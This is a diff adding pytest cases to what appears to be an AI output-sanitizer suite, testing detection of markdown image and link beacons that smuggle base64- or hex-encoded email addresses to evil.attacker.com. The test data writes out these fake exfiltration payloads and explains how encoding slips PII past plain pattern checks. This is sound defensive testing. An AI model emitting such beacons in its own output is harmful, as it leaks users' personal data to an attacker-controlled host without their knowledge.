@@ -897,6 +897,55 @@ def test_g13_benign_output_not_flagged_or_mutated(label, payload):
     assert neutralize_exfil_channels(payload) == payload, f"{label}: benign output was mutated"
 
 
+# ── G39: exfil channel carrying ENCODED PII (single + layered base64/hex) ─────────
+# G13 froze arbitrary-blob beacons and PLAINTEXT PII in the URL. A subtler beacon
+# base64/hex-encodes the PII itself inside the query/path so the RAW url trips no PII
+# pattern — only _url_smuggles_data's transport-decode-then-detect path recovers it
+# (decoded tail -> detect_pii -> "sensitive_payload"). Layered base64(base64(email))
+# exercises the depth-bounded decode. The sanitized egress must carry neither the
+# encoded blob, the decoded PII, nor the zero-click image auto-render. Re-proved in
+# iteration: 5/5 defanged, egress oracle-confirmed hasPII=false (aidefence).
+_G39_EMAIL = "john@example.com"
+_G39_B64 = base64.b64encode(_G39_EMAIL.encode()).decode()
+_G39_B64B64 = base64.b64encode(_G39_B64.encode()).decode()
+_G39_HEX = _G39_EMAIL.encode().hex()
+_G39_EXFIL = [
+    ("g39_img_b64_email_query", f"Done ![x](https://evil.attacker.com/log?d={_G39_B64})", _G39_B64),
+    ("g39_link_b64_email",      f"[open](https://evil.attacker.com/c?u={_G39_B64})",       _G39_B64),
+    ("g39_bare_hex_email",      f"ref https://evil.attacker.com/x?p={_G39_HEX}",           _G39_HEX),
+    ("g39_img_b64_path",        f"![p](https://evil.attacker.com/beacon/{_G39_B64.rstrip('=')}.png)", _G39_B64.rstrip('=')),
+    ("g39_img_layered_b64",     f"![x](https://evil.attacker.com/l?d={_G39_B64B64})",      _G39_B64B64),
+]
+
+
+@pytest.mark.parametrize("label,payload,blob", _G39_EXFIL)
+def test_g39_encoded_pii_exfil_channel_neutralized(label, payload, blob):
+    """Encoded-PII exfil beacons are detected via decode-then-detect, and the sanitized
+    egress carries neither the encoded blob, the decoded PII, nor an auto-render."""
+    assert list(_scan_exfil_channels(payload)), f"{label}: encoded-PII exfil not detected"
+    out = neutralize_exfil_channels(payload)
+    assert blob not in out, f"{label}: encoded blob survived neutralization (LEAK)"
+    assert _G39_EMAIL not in out, f"{label}: decoded PII surfaced in egress (LEAK)"
+    assert "[exfil-redacted]" in out, f"{label}: payload tail not redacted"
+    assert not any(_G13_HOST in m.group(2) for m in _MD_IMAGE_RE.finditer(out)), (
+        f"{label}: zero-click image auto-render to attacker host survived")
+
+
+# G39 false-positive floor: opaque-but-benign encoded-looking tokens on LINKS / bare
+# URLs (presigned tokens, git hashes) must NOT be defanged — links trip only on the
+# stronger sensitive_payload signal, never on a bare printable/binary encoded blob.
+_G39_BENIGN = [
+    ("g39_benign_link_token",  "[dl](https://cdn.trusted.com/f/YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo)"),
+    ("g39_benign_bare_hash",   "commit https://git.example.com/c/9f8e7d6c5b4a32109f8e7d6c5b4a3210"),
+]
+
+
+@pytest.mark.parametrize("label,payload", _G39_BENIGN)
+def test_g39_benign_opaque_token_not_defanged(label, payload):
+    assert not list(_scan_exfil_channels(payload)), f"{label}: benign opaque token flagged as exfil"
+    assert neutralize_exfil_channels(payload) == payload, f"{label}: benign opaque token defanged (FP)"
+
+
 # ================================================================== fixed gap (now FROZEN)
 # G10 — Tier-2 semantic redact was a byte no-op. The guard model flags PII/secret with
 # no deterministic regex (free-text names, non-standard card/ID layouts, passphrases);
